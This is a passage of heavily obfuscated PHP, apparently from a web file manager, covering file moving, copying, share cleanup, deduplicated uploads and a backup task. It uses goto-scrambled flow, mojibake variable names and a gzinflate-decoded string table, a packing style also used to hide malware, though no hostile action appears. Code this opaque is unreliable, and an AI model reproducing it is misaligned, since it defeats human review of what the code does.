$e„ø™¯[87]) { return !1; } Hook::trigger($e„ø™¯[557], $d·Ñ‹ÑÀ¦); $this->targetIsDelete = intval($E‘¯ã¡»‰ï[$e„ø™¯[421]]); goto BŒ±Ïë£ì; e±Œ‹Å†ó¬: $this->updateModifyTime($DÔˆÒëÕó©); Model($e„ø™¯[532])->eventMove($dç‘‘Ë¹ƒ‚, $E‘¯ã¡»‰ï[$e„ø™¯[476]], $A¬éŸ¹¶µ÷); Hook::trigger($e„ø™¯[558], $d·Ñ‹ÑÀ¦); goto Aô£µÔï²ù; f÷¨Õ­ùˆÀ: $this->lockMoveEnd($dç‘‘Ë¹ƒ‚); $this->lockWriteEnd($A¬éŸ¹¶µ÷, $Cõê¶¸’¿É); $this->folderSizeReset($E‘¯ã¡»‰ï[$e„ø™¯[476]]); goto Eíİ–ä½¼“; fˆ»Áì§ª´: } private function _move($C™Ö ·ƒ¬†, $f“—„ï´±Ç, $cƒõ´¹éÊ, &$aˆÔ‘ÌÂà‘, $Aº™Ò°…²ë = '') { goto Fµ­Ë·»ù; FÎ¹–¤Ì‰²: $f­…©°ÕÃê = !1; if ($cÊÕñÂÜ¼ä) { if ($cƒõ´¹éÊ == REPEAT_RENAME_FOLDER) { $a¨Ò¼ëÛ¬ = $this->fileNameAuto($f“—„ï´±Ç, $a¨Ò¼ëÛ¬, $cƒõ´¹éÊ, $cÊÕñÂÜ¼ä); $BƒÉÖ‚‡ƒå = $this->_moveForce($C™Ö ·ƒ¬†, $f“—„ï´±Ç, $a¨Ò¼ëÛ¬); } else { if ($cƒõ´¹éÊ == REPEAT_RENAME_FOLDER) { $cƒõ´¹éÊ = REPEAT_RENAME; } $CÍ¡Œœ‡ë = $this->_childrenListSelect($C™Ö ·ƒ¬†); foreach ($CÍ¡Œœ‡ë as $F¹âùÆê–’) { $this->_move($F¹âùÆê–’[$f¹õ¨¼‘Î[394]], $fë‰íƒ”Ü¬, $cƒõ´¹éÊ, $aˆÔ‘ÌÂà‘); } $f­…©°ÕÃê = !0; } } else { if ($cƒõ´¹éÊ == REPEAT_SKIP) { $f­…©°ÕÃê = !0; } else { if ($cƒõ´¹éÊ == REPEAT_RENAME || $cƒõ´¹éÊ == REPEAT_RENAME_FOLDER) { $a¨Ò¼ëÛ¬ = $this->fileNameAuto($f“—„ï´±Ç, $a¨Ò¼ëÛ¬, $cƒõ´¹éÊ, $cÊÕñÂÜ¼ä); $BƒÉÖ‚‡ƒå = $this->_moveForce($C™Ö ·ƒ¬†, $f“—„ï´±Ç, $a¨Ò¼ëÛ¬); } else { if ($cƒõ´¹éÊ == REPEAT_REPLACE) { $eåğ¸ËÖÌ = $this->sourceInfoCache($fë‰íƒ”Ü¬); $D“±ÄšêŸÍ = $this->fileHistory($eåğ¸ËÖÌ, $a‘ÍÙñòºŒ[$f¹õ¨¼‘Î[445]], $a‘ÍÙñòºŒ[$f¹õ¨¼‘Î[78]]); if ($D“±ÄšêŸÍ) { $aˆÔ‘ÌÂà‘[$f¹õ¨¼‘Î[528]][] = $a‘ÍÙñòºŒ[$f¹õ¨¼‘Î[445]]; } else { $f­…©°ÕÃê = !0; } } } } } if ($f­…©°ÕÃê && !$aˆÔ‘ÌÂà‘[$f¹õ¨¼‘Î[559]]) { $aˆÔ‘ÌÂà‘[$f¹õ¨¼‘Î[559]] = !0; } goto dÄé©äëº; dÄé©äëº: return $BƒÉÖ‚‡ƒå; goto C–ë˜åâ™“; b´Öìí¾Ş×: $this->lockWriteStart($f“—„ï´±Ç, $a¨Ò¼ëÛ¬); if (!$fë‰íƒ”Ü¬) { return $this->_moveForce($C™Ö ·ƒ¬†, $f“—„ï´±Ç, $a¨Ò¼ëÛ¬); } $BƒÉÖ‚‡ƒå = $fë‰íƒ”Ü¬; goto FÎ¹–¤Ì‰²; C®­ù¦´³: $a¨Ò¼ëÛ¬ = $Aº™Ò°…²ë ? $Aº™Ò°…²ë : $a‘ÍÙñòºŒ[$f¹õ¨¼‘Î[28]]; $fë‰íƒ”Ü¬ = $this->fileNameExistCache($f“—„ï´±Ç, $a¨Ò¼ëÛ¬); $this->lockMoveStart($C™Ö ·ƒ¬†); goto b´Öìí¾Ş×; Fµ­Ë·»ù: $f¹õ¨¼‘Î =& $_SERVER[¬ı§†‰ú˜¼]; $a‘ÍÙñòºŒ = $this->sourceInfo($C™Ö ·ƒ¬†); $cÊÕñÂÜ¼ä = $a‘ÍÙñòºŒ[$f¹õ¨¼‘Î[401]] == $f¹õ¨¼‘Î[87]; goto C®­ù¦´³; C–ë˜åâ™“: } private function _moveForce($a‡¼¨¢‘¾Ó, $e÷ ¸Ÿ–“›, $D÷ğ†ßÍİ) { goto aÂëŞ”­®ï; F¼„öªˆ™ó: if (!$Bª·÷Ãô’§ && $this->moveClearAuth) { Model($fŠ›÷¸Ğ õ[480])->authClear($a‡¼¨¢‘¾Ó); } $Fšî™ƒ‡ÙÑ = $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[421]] == $fŠ›÷¸Ğ õ[87] && $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[421]] != $fŠ›÷¸Ğ õ[87]; if ($Fšî™ƒ‡ÙÑ) { $e«Êñ¢æØ[$fŠ›÷¸Ğ õ[420]] = 0; } goto D„Ú‘×ä; Eğ’ö³ºÂ: $E¤¦öåİ·Ï = $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[401]] == $fŠ›÷¸Ğ õ[87]; $e«Êñ¢æØ = array($fŠ›÷¸Ğ õ[393] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[394]], $fŠ›÷¸Ğ õ[552] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[485]] . $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[394]] . $fŠ›÷¸Ğ õ[47], $fŠ›÷¸Ğ õ[548] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[402]], $fŠ›÷¸Ğ õ[549] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[482]], $fŠ›÷¸Ğ õ[551] => USER_ID, $fŠ›÷¸Ğ õ[411] => $D÷ğ†ßÍİ); $Bª·÷Ãô’§ = $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[402]] == SourceModel::TYPE_GROUP && $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[402]] == SourceModel::TYPE_GROUP && $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[482]] == $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[482]]; goto F¼„öªˆ™ó; D„Ú‘×ä: if ($E¤¦öåİ·Ï) { $F‹²‡ç‹°İ = array($fŠ›÷¸Ğ õ[552] => array($fŠ›÷¸Ğ õ[511], $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[485]] . $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[394]] . $fŠ›÷¸Ğ õ[512])); $BÃÇ¼¼ƒã = $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[485]] . $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[394]] . $fŠ›÷¸Ğ õ[47]; $AŸà—ê…ä‘ = $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[485]] . $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[394]] . $fŠ›÷¸Ğ õ[47] . $FÑ×Ş÷ÏÚ[$fŠ›÷¸Ğ õ[394]] . $fŠ›÷¸Ğ õ[47]; $a£’áßÈ¾¹ = array($fŠ›÷¸Ğ õ[552] => array($fŠ›÷¸Ğ õ[560], "\x72\145\x70\x6c\141\x63\145\50\x70\141\162\145\x6e\x74\114\145\166\x65\x6c\x2c\47{$BÃÇ¼¼ƒã}\x27\x2c\47{$AŸà—ê…ä‘}\x27\51"), $fŠ›÷¸Ğ õ[548] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[402]], $fŠ›÷¸Ğ õ[549] => $b±¿ŞìòÜå[$fŠ›÷¸Ğ õ[482]]); if ($Fšî™ƒ‡ÙÑ) { $a£’áßÈ¾¹[$fŠ›÷¸Ğ õ[420]] = 0; } $this->where($F‹²‡ç‹°İ)->data($a£’áßÈ¾¹)->save(); } $this->where(array($fŠ›÷¸Ğ õ[408] => $a‡¼¨¢‘¾Ó))->data($e«Êñ¢æØ)->save(); return $a‡¼¨¢‘¾Ó; goto AËƒª´äŞ£; aÂëŞ”­®ï: $fŠ›÷¸Ğ õ =& $_SERVER[¬ı§†‰ú˜¼]; $FÑ×Ş÷ÏÚ = $this->sourceInfo($a‡¼¨¢‘¾Ó); $b±¿ŞìòÜå = $this->sourceInfo($e÷ ¸Ÿ–“›); goto Eğ’ö³ºÂ; AËƒª´äŞ£: } private function clearShare($Dƒ—¶ùö, $eŞõÛàßé) { goto eŒË™åÂ ç; e‰”„ö®Ğ: if (!$eìíñİ‹í) { return; } $dò¼’íÌ™í = array($cªŞã¤·”[394] => array($cªŞã¤·”[7], $eìíñİ‹í), $cªŞã¤·”[473] => 1); $cöˆ‰ä¯ïî = Model($cªŞã¤·”[562])->field($cªŞã¤·”[466])->where($dò¼’íÌ™í)->select(); goto EØÑÊÇÌ¨º; eŒË™åÂ ç: $cªŞã¤·” =& $_SERVER[¬ı§†‰ú˜¼]; $E˜¥¹Ÿ¹ = $this->sourceInfo($Dƒ—¶ùö); $EÍ¶“—Åµè = $this->sourceInfo($eŞõÛàßé); goto BŸÜ¬×”¨ï; BŸÜ¬×”¨ï: if ($E˜¥¹Ÿ¹[$cªŞã¤·”[482]] == $EÍ¶“—Åµè[$cªŞã¤·”[482]] && $E˜¥¹Ÿ¹[$cªŞã¤·”[402]] == $cªŞã¤·”[561]) { return; } $dò¼’íÌ™í = array($cªŞã¤·”[485] => array($cªŞã¤·”[511], $E˜¥¹Ÿ¹[$cªŞã¤·”[485]] . $Dƒ—¶ùö . $cªŞã¤·”[512])); $eìíñİ‹í = $this->field($cªŞã¤·”[408])->where($dò¼’íÌ™í)->getField($cªŞã¤·”[394], !0); goto e‰”„ö®Ğ; EØÑÊÇÌ¨º: if (!$cöˆ‰ä¯ïî) { return; } $cöˆ‰ä¯ïî = array_to_keyvalue($cöˆ‰ä¯ïî, $cªŞã¤·”[33], $cªŞã¤·”[466]); $dò¼’íÌ™í = array($cªŞã¤·”[466] => array($cªŞã¤·”[7], $cöˆ‰ä¯ïî)); goto A«öÖµ„«È; A«öÖµ„«È: Model($cªŞã¤·”[562])->where($dò¼’íÌ™í)->save(array($cªŞã¤·”[473] => 0)); Model($cªŞã¤·”[563])->where($dò¼’íÌ™í)->delete(); goto DÇ˜áó¼³–; DÇ˜áó¼³–: } public function copyFolderFromIO($B¢ÕÕ—Ô°, $BÚ´‹íêŒ, $Cµ«ëÑÇ¥, $cñà¶±´ÊŒ, $fÍÃ­¹Ô¢£, $DÇ­èñØ–ò = false) { goto Fì«¤ù™®è; b¨óèÁêöö: Model($eîš©áÙ–[531])->addAll($cø½¼©Ş»Ö[$eîš©áÙ–[529]], array(), !0); Model($eîš©áÙ–[532])->eventCopy($C¾°ƒ); $this->saveAll($cø½¼©Ş»Ö[$eîš©áÙ–[530]]); goto a¼”Åóšé; A²¾½çÔÉŞ: if ($CÉªØ©‰îˆ) { $this->_childrenAllMake($CÉªØ©‰îˆ); } Hook::trigger($eîš©áÙ–[565]); $this->_copyChildTo($B¢ÕÕ—Ô°, $BÚ´‹íêŒ, $C¾°ƒ, $cñà¶±´ÊŒ, $cø½¼©Ş»Ö, $fÍÃ­¹Ô¢£); goto f¬„È³†¥µ; f¬„È³†¥µ: Hook::trigger($eîš©áÙ–[566]); if ($C¾°ƒ) { $this->folderSizeResetChildren($C¾°ƒ); } $this->_childrenListClear(); goto b¨óèÁêöö; cÔ·©èÍà: $CÉªØ©‰îˆ = $this->fileNameExist($Cµ«ëÑÇ¥, $C‹ŠÙë¯½); $C¾°ƒ = $this->mkdir($Cµ«ëÑÇ¥, $C‹ŠÙë¯½, $cñà¶±´ÊŒ); if (!$CÉªØ©‰îˆ || $cñà¶±´ÊŒ == REPEAT_RENAME_FOLDER) { $cñà¶±´ÊŒ = !1; } goto A²¾½çÔÉŞ; a¼”Åóšé: Model($eîš©áÙ–[448])->linkAdd($cø½¼©Ş»Ö[$eîš©áÙ–[528]]); Model($eîš©áÙ–[448])->remove($cø½¼©Ş»Ö[$eîš©áÙ–[564]]); $this->folderSizeReset($Cµ«ëÑÇ¥); goto aÀŠËÙ¾È; aÀŠËÙ¾È: $this->updateModifyTime($Cµ«ëÑÇ¥); return $C¾°ƒ; goto e‘ä·†ÇÜ; Fì«¤ù™®è: $eîš©áÙ– =& $_SERVER[¬ı§†‰ú˜¼]; $cø½¼©Ş»Ö = array($eîš©áÙ–[529] => array(), $eîš©áÙ–[530] => array(), $eîš©áÙ–[528] => array(), $eîš©áÙ–[564] => array()); $C‹ŠÙë¯½ = $DÇ­èñØ–ò ? $DÇ­èñØ–ò : $B¢ÕÕ—Ô°->pathThis($BÚ´‹íêŒ); goto cÔ·©èÍà; e‘ä·†ÇÜ: } private function _copyChildTo($CÕ‹—ÎÎ¬, $B·é³Ü«Àğ, $c–»Áù”¢, $Cçó£¶„÷«, &$a±ºîŠŠ¿¬, $aª‡Ö¿Š¡§) { goto B¦¨§Šö; C¤‘ÒŞ‡›ß: $eÔƒ”¬Š = array(); foreach ($DÍ‹Îàç‚ as &$d«Ã¸¸ÕÇÙ) { goto Fˆ¹Ç ¡Ü·; Fˆ¹Ç ¡Ü·: if (isset($b¹÷¸£Œì[$d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]]])) { $d«Ã¸¸ÕÇÙ = $b¹÷¸£Œì[$d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]]]; } $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[401]] = $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[29]] == $DÜÑÖ÷¨Á[77]; $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[403]] = _get($d«Ã¸¸ÕÇÙ, $DÜÑÖ÷¨Á[168], $DÜÑÖ÷¨Á[33]); goto aà´ö¹æ¶§; D½¸ÔßÆÜ: if ($Cçó£¶„÷«) { $bõñ›íÆŠ = $this->fileNameExistCache($c–»Áù”¢, $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]]); if ($bõñ›íÆŠ) { if ($d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[401]] || $Cçó£¶„÷« == REPEAT_SKIP) { continue; } if ($Cçó£¶„÷« == REPEAT_REPLACE) { $CÒÃŠ„³©Û = $this->sourceInfoCache($bõñ›íÆŠ); $bëÔóã„¸Ù = $this->fileHistory($CÒÃŠ„³©Û, $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]], $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[78]]); if ($bëÔóã„¸Ù) { $a±ºîŠŠ¿¬[$DÜÑÖ÷¨Á[528]][] = $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]]; } continue; } else { if ($Cçó£¶„÷« == REPEAT_RENAME) { $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]] = $this->fileNameAutoCache($c–»Áù”¢, $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]], $Cçó£¶„÷«, !1); } } } } if (!$d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[401]] && $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]]) { $a±ºîŠŠ¿¬[$DÜÑÖ÷¨Á[528]][] = $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]]; } $eÔƒ”¬Š[] = $this->_makeItemData($d«Ã¸¸ÕÇÙ, $a‹†À·áŒİ, $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]]); goto aÌóîÙ†›¤; aà´ö¹æ¶§: $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[78]] = _get($d«Ã¸¸ÕÇÙ, $DÜÑÖ÷¨Á[78], 0); $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]] = _get($d«Ã¸¸ÕÇÙ, $DÜÑÖ÷¨Á[445], 0); if (!isset($d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[567]]) && $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]]) { $a±ºîŠŠ¿¬[$DÜÑÖ÷¨Á[564]][] = $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[445]]; } goto D½¸ÔßÆÜ; aÌóîÙ†›¤: } unset($d«Ã¸¸ÕÇÙ); goto DšÖ¼èæäï; DšÖ¼èæäï: if (!empty($eÔƒ”¬Š)) { $this->addAll($eÔƒ”¬Š); $this->_childrenListSelect($c–»Áù”¢); } $cµéî•ÅÍ = $this->_childrenList($c–»Áù”¢); $cµéî•ÅÍ = array_to_keyvalue($cµéî•ÅÍ, $DÜÑÖ÷¨Á[28]); goto f˜³ëº†Ê‹; ašõš¢¾àŒ: $bÑ‚Î§èŠÙ = $bÑ‚Î§èŠÙ ? $bÑ‚Î§èŠÙ : array($DÜÑÖ÷¨Á[74] => array(), $DÜÑÖ÷¨Á[75] => array()); $DÍ‹Îàç‚ = array_merge($bÑ‚Î§èŠÙ[$DÜÑÖ÷¨Á[74]], $bÑ‚Î§èŠÙ[$DÜÑÖ÷¨Á[75]]); $b¹÷¸£Œì = $this->_addFiles($CÕ‹—ÎÎ¬, $bÑ‚Î§èŠÙ[$DÜÑÖ÷¨Á[74]], $aª‡Ö¿Š¡§); goto C¤‘ÒŞ‡›ß; f˜³ëº†Ê‹: foreach ($DÍ‹Îàç‚ as $d«Ã¸¸ÕÇÙ) { $CÒÃŠ„³©Û = $cµéî•ÅÍ[$d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[28]]]; $b¨‚‚ÕÊÉ = $CÒÃŠ„³©Û[$DÜÑÖ÷¨Á[394]]; $this->_copyApplyMeta($CÒÃŠ„³©Û, $a±ºîŠŠ¿¬); if ($d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[29]] == $DÜÑÖ÷¨Á[77]) { $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[76]] = $CÕ‹—ÎÎ¬->getPathInner($d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[76]]); $this->_copyChildTo($CÕ‹—ÎÎ¬, $d«Ã¸¸ÕÇÙ[$DÜÑÖ÷¨Á[76]], $b¨‚‚ÕÊÉ, $Cçó£¶„÷«, $a±ºîŠŠ¿¬, $aª‡Ö¿Š¡§); } } goto eËˆë÷£îù; B¦¨§Šö: $DÜÑÖ÷¨Á =& $_SERVER[¬ı§†‰ú˜¼]; $a‹†À·áŒİ = $this->sourceInfoCache($c–»Áù”¢); $bÑ‚Î§èŠÙ = $CÕ‹—ÎÎ¬->listPath($B·é³Ü«Àğ); goto ašõš¢¾àŒ; eËˆë÷£îù: } private function _addFiles($F…ŸÖÛãŸß, $BâÏ–³–À›, $BœĞÓÁ£¸ƒ) { goto DèØËÑ³á; C±´·½Î¡: $dø‡œ«ÉÕ = Model($c‡á¼ÆÁ´«[570]); $eõÕÅóéÚ¸ = $dø‡œ«ÉÕ->where($b”ßĞÚŒœŞ)->select(); $eõÕÅóéÚ¸ = $eõÕÅóéÚ¸ ? $eõÕÅóéÚ¸ : array(); goto CÍ™ê¶†ä ; BÕíåä¬ƒ: foreach ($BâÏ–³–À› as $E…·ß§®·) { $D‰˜—¯¸Ò×[$E…·ß§®·[$c‡á¼ÆÁ´«[28]]] = $E…·ß§®·; } return $D‰˜—¯¸Ò×; goto Fœ×ä®Š’‹; DƒÆàä”Ì¨: foreach ($BâÏ–³–À› as &$a«„‚‚ñ®) { goto C«îÌœ­Õâ; bŞ»¡½Ç‘œ: if (count($cìÈ‚¯Ä[$aÕ…—á§Ü]) > 1) { $a«„‚‚ñ®[$c‡á¼ÆÁ´«[567]] = !0; } goto a„´Æ¥Üî; C«îÌœ­Õâ: Hook::trigger($c‡á¼ÆÁ´«[568], $a«„‚‚ñ®); $a«„‚‚ñ®[$c‡á¼ÆÁ´«[76]] = $F…ŸÖÛãŸß->getPathInner($a«„‚‚ñ®[$c‡á¼ÆÁ´«[76]]); $A•’÷Ô³Í = $F…ŸÖÛãŸß->hashSimple($a«„‚‚ñ®[$c‡á¼ÆÁ´«[76]]); goto B¼ªÈââÁ«; EŸŠƒ‰ƒÙ: $a«„‚‚ñ®[$c‡á¼ÆÁ´«[170]] = $aÕ…—á§Ü; Hook::trigger($c‡á¼ÆÁ´«[569], $a«„‚‚ñ®); $cìÈ‚¯Ä[$aÕ…—á§Ü][] =& $a«„‚‚ñ®; goto bŞ»¡½Ç‘œ; B¼ªÈââÁ«: $aÕ…—á§Ü = $F…ŸÖÛãŸß->hashMd5($a«„‚‚ñ®[$c‡á¼ÆÁ´«[76]]); if (strlen($aÕ…—á§Ü) > 10 && !isset($cìÈ‚¯Ä[$aÕ…—á§Ü])) { $cìÈ‚¯Ä[$aÕ…—á§Ü] = array(); } $a«„‚‚ñ®[$c‡á¼ÆÁ´«[171]] = $A•’÷Ô³Í; goto EŸŠƒ‰ƒÙ; a„´Æ¥Üî: } unset($a«„‚‚ñ®); $b”ßĞÚŒœŞ = array($c‡á¼ÆÁ´«[170] => array($c‡á¼ÆÁ´«[7], array_keys($cìÈ‚¯Ä))); goto C±´·½Î¡; b¾¡¼µŒ‹: $eõÕÅóéÚ¸ = $eõÕÅóéÚ¸ ? $eõÕÅóéÚ¸ : array(); foreach ($eõÕÅóéÚ¸ as $a®Ñ®³½) { if (!isset($cìÈ‚¯Ä[$a®Ñ®³½[$c‡á¼ÆÁ´«[170]]])) { continue; } $dÑ²®â‚¢Ë =& $cìÈ‚¯Ä[$a®Ñ®³½[$c‡á¼ÆÁ´«[170]]]; foreach ($dÑ²®â‚¢Ë as &$a«„‚‚ñ®) { $a«„‚‚ñ®[$c‡á¼ÆÁ´«[445]] = $a®Ñ®³½[$c‡á¼ÆÁ´«[445]]; } unset($a«„‚‚ñ®); } $D‰˜—¯¸Ò× = array(); goto BÕíåä¬ƒ; DèØËÑ³á: $c‡á¼ÆÁ´« =& $_SERVER[¬ı§†‰ú˜¼]; if (!$BâÏ–³–À› || count($BâÏ–³–À›) == 0) { return array(); } $cìÈ‚¯Ä = array(); goto DƒÆàä”Ì¨; DÔŒ«ì·à°: $dø‡œ«ÉÕ->addAll($EŞ–ŸğÇ‘ƒ); $b”ßĞÚŒœŞ = array($c‡á¼ÆÁ´«[170] => array($c‡á¼ÆÁ´«[7], array_keys($cìÈ‚¯Ä))); $eõÕÅóéÚ¸ = $dø‡œ«ÉÕ->where($b”ßĞÚŒœŞ)->select(); goto b¾¡¼µŒ‹; CÍ™ê¶†ä : foreach ($eõÕÅóéÚ¸ as $a®Ñ®³½) { if (!isset($cìÈ‚¯Ä[$a®Ñ®³½[$c‡á¼ÆÁ´«[170]]])) { continue; } $F¡Šö³¿ÃÊ = $cìÈ‚¯Ä[$a®Ñ®³½[$c‡á¼ÆÁ´«[170]]]; foreach ($F¡Šö³¿ÃÊ as &$a«„‚‚ñ®) { $a«„‚‚ñ®[$c‡á¼ÆÁ´«[445]] = $a®Ñ®³½[$c‡á¼ÆÁ´«[445]]; $a«„‚‚ñ®[$c‡á¼ÆÁ´«[567]] = !0; } unset($a«„‚‚ñ®); } $EŞ–ŸğÇ‘ƒ = array(); foreach ($BâÏ–³–À› as $e”ˆ‰‡–†ß) { if (isset($e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[567]]) && $e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[567]]) { continue; } $F–Ö½¹„ê = $F…ŸÖÛãŸß->getPathInner($e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[76]]); $b‚óÑöÎª¹ = $dø‡œ«ÉÕ->addFileMake($F–Ö½¹„ê, $e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[78]], $e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[171]], $e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[170]], $e”ˆ‰‡–†ß[$c‡á¼ÆÁ´«[28]], $BœĞÓÁ£¸ƒ); $EŞ–ŸğÇ‘ƒ[] = $b‚óÑöÎª¹; } goto DÔŒ«ì·à°; Fœ×ä®Š’‹: } } define($_SERVER[¬ı§†‰ú˜¼][571], $_SERVER[¬ı§†‰ú˜¼][572]); goto AšÎØ‡åÆ; AšÎØ‡åÆ: $Fö…‚ÑÜ = $_SERVER[¬ı§†‰ú˜¼][573]; while ($Fö…‚ÑÜ < $_SERVER[¬ı§†‰ú˜¼][574]) { if ($Fö…‚ÑÜ >= 0) { break; } $Fö…‚ÑÜ++; } $_SERVER[öÔÕ©€î‘] = explode($_SERVER[¬ı§†‰ú˜¼][575], gzinflate(substr($_SERVER[¬ı§†‰ú˜¼][576], 10, -8))); goto F¬İ…®÷±¯; c¢ä”µ™“Ü: class BackupFile { public function __construct() { } public function index() { goto e®¹‰¦ÓÊ; a¶”Àº­Àß: $Cé‰îÛœĞË->task[$_SERVER[¬ı§†‰ú˜¼][724]] = $bà¨•ÙõØª; $açÖ§Ò‚¦­ = array($_SERVER[¬ı§†‰ú˜¼][784] => $d¼áì¥¹õ‰, $_SERVER[¬ı§†‰ú˜¼][785] => $bà¨•ÙõØª, $_SERVER[¬ı§†‰ú˜¼][786] => time()); Backup::set($açÖ§Ò‚¦­); goto C®ˆÀ×«Ò£; e®¹‰¦ÓÊ: $bùæÏÖ­¦è = Backup::get(); $D¾¼ÅİÑ¿— = $bùæÏÖ­¦è[$_SERVER[¬ı§†‰ú˜¼][290]][$_SERVER[¬ı§†‰ú˜¼][192]][$_SERVER[¬ı§†‰ú˜¼][445]]; $b†ïå²…ö = array($_SERVER[¬ı§†‰ú˜¼][446] => array($_SERVER[¬ı§†‰ú˜¼][780], $D¾¼ÅİÑ¿—), $_SERVER[¬ı§†‰ú˜¼][781] => array($_SERVER[¬ı§†‰ú˜¼][328], $bùæÏÖ­¦è[$_SERVER[¬ı§†‰ú˜¼][716]])); goto b©ŞÉë•¬Š; b©ŞÉë•¬Š: $d¼áì¥¹õ‰ = (int) Model($_SERVER[¬ı§†‰ú˜¼][748])->where($b†ïå²…ö)->count($_SERVER[¬ı§†‰ú˜¼][445]); $bà¨•ÙõØª = (int) Model($_SERVER[¬ı§†‰ú˜¼][748])->where($b†ïå²…ö)->sum($_SERVER[¬ı§†‰ú˜¼][78]); $Cé‰îÛœĞË = new TaskFileTransfer($_SERVER[¬ı§†‰ú˜¼][782], $_SERVER[¬ı§†‰ú˜¼][743], $d¼áì¥¹õ‰, LNG($_SERVER[¬ı§†‰ú˜¼][744]) . $_SERVER[¬ı§†‰ú˜¼][745] . LNG($_SERVER[¬ı§†‰ú˜¼][783])); goto a¶”Àº­Àß; eÔä—öá§Û: $Cê¥™—Ú = $FøÀİŸ‚Ëº = 0; do { $aŒ§Û‡µÓñ = $_SERVER[¬ı§†‰ú˜¼][787]; $dÉ¢¥—‰¤æ = Model($_SERVER[¬ı§†‰ú˜¼][748])->where($b†ïå²…ö)->field($aŒ§Û‡µÓñ)->order($_SERVER[¬ı§†‰ú˜¼][788])->selectPage($Bù¿¾ÉÆ…õ, $BŞİÔ‰š·); $dİ¦‰ôİïä = !empty($dÉ¢¥—‰¤æ[$_SERVER[¬ı§†‰ú˜¼][366]]) ? $dÉ¢¥—‰¤æ[$_SERVER[¬ı§†‰ú˜¼][366]] : array(); foreach ($dİ¦‰ôİïä as $b¡À‡’­Åê) { goto eößŠ†Ş¦²; C»ŠÑ¬³Ÿ¡: $b¸¼àô“Ãï += $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][78]]; $FøÀİŸ‚Ëº += 1; $Cê¥™—Ú += $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][78]]; goto B‡×¥ªŠ™; DØÔ¯Ó…ù¼: if (IO::exist($f¼†Ôíëˆõ)) { $Cé‰îÛœĞË->updateFileEnd($b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][28]], $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][78]]); } else { $f¼†Ôíëˆõ = get_path_father($f¼†Ôíëˆõ); IO::mkdir($f¼†Ôíëˆõ); if (!IO::copy($AãöÍ½ŠŞ, $f¼†Ôíëˆõ, $_SERVER[¬ı§†‰ú˜¼][791])) { write_log($_SERVER[¬ı§†‰ú˜¼][792] . $AãöÍ½ŠŞ . $_SERVER[¬ı§†‰ú˜¼][775] . $f¼†Ôíëˆõ . $_SERVER[¬ı§†‰ú˜¼][503], $_SERVER[¬ı§†‰ú˜¼][743]); $F”ÖÏäôğÖ = !1; break; } } $D¾¼ÅİÑ¿— = $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][445]]; $cĞÀÔŒœÊª += 1; goto C»ŠÑ¬³Ÿ¡; eößŠ†Ş¦²: if (!$this->_fileExist($b¡À‡’­Åê, $Cóµ’µæ, $fÉéô÷µÑã)) { $d¼áì¥¹õ‰ -= 1; $bà¨•ÙõØª -= (int) $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][78]]; write_log("\x66\x69\x6c\x65\x20\x6e\x6f\164\x20\x65\x78\x69\163\x74\56\x66\x69\x6c\145\x49\x44\x3a{$b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][445]]}\54\40\x70\x61\x74\x68\72{$b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][76]]}", $_SERVER[¬ı§†‰ú˜¼][789]); continue; } 